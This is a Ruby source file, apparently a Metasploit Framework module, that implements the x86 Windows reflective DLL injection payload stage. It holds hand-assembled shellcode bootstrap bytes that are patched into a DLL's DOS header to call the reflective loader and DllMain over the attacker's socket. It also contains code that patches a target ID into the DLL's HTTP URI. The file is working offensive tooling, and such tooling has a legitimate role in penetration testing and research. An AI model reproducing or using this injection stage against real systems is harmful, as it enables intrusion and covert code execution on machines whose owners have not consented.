# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/reflective_dll_loader'

module Msf


###
#
# Common module stub for ARCH_X86 payloads that make use of Reflective DLL Injection.
#
###


module Payload::Windows::ReflectiveDllInject

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Reflective DLL Injection',
      'Description'   => 'Inject a DLL via a reflective loader',
      'Author'        => [ 'sf' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'PayloadCompat' =>
        {
          'Convention' => 'sockedi -https',
        },
      'Stage'         =>
        {
          'Offsets' =>
            {
              'EXITFUNC' => [ 33, 'V' ]
            },
          'Payload' => ""
        }
      ))

    register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
  end

  def library_path
    datastore['DLL']
  end

  def stage_payload(target_id=nil)
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(library_path)

    exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration

    bootstrap = "\x4D" +                            # dec ebp             ; M
          "\x5A" +                            # pop edx             ; Z
          "\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
          "\x5B" +                            # pop ebx             ; get our location (+7)
          "\x52" +                            # push edx            ; push edx back
          "\x45" +                            # inc ebp             ; restore ebp
          "\x55" +                            # push ebp            ; save ebp
          "\x89\xE5" +                        # mov ebp, esp        ; setup fresh stack frame
          "\x81\xC3" + [offset-7].pack( "V" ) + # add ebx, 0x???????? ; add offset to ReflectiveLoader
          "\xFF\xD3" +                        # call ebx            ; call ReflectiveLoader
          "\x89\xC3" +                        # mov ebx, eax        ; save DllMain for second call
          "\x57" +                            # push edi            ; our socket
          "\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
          "\x50" +                            # push eax            ; some value for hinstance
          "\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
          "\x68" + exit_funk +                # push 0x????????     ; our EXITFUNC placeholder
          "\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
          "\x50" +                            # push eax            ; some value for hinstance
          "\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if( bootstrap.length > 62 )
      print_error( "Reflective Dll Injection (x86) generated an oversized bootstrap!" )
      return
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap

    # patch the target ID into the URI if specified
    if target_id
      i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
      if i
        t = target_id.to_s
        raise "Target ID must be less than 5 bytes" if t.length > 4
        u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
        print_status("Patching Target ID #{t} into DLL")
        dll[i, u.length] = u
      end
    end

    # return our stage to be loaded by the intermediate stager
    return dll
  end

end

end

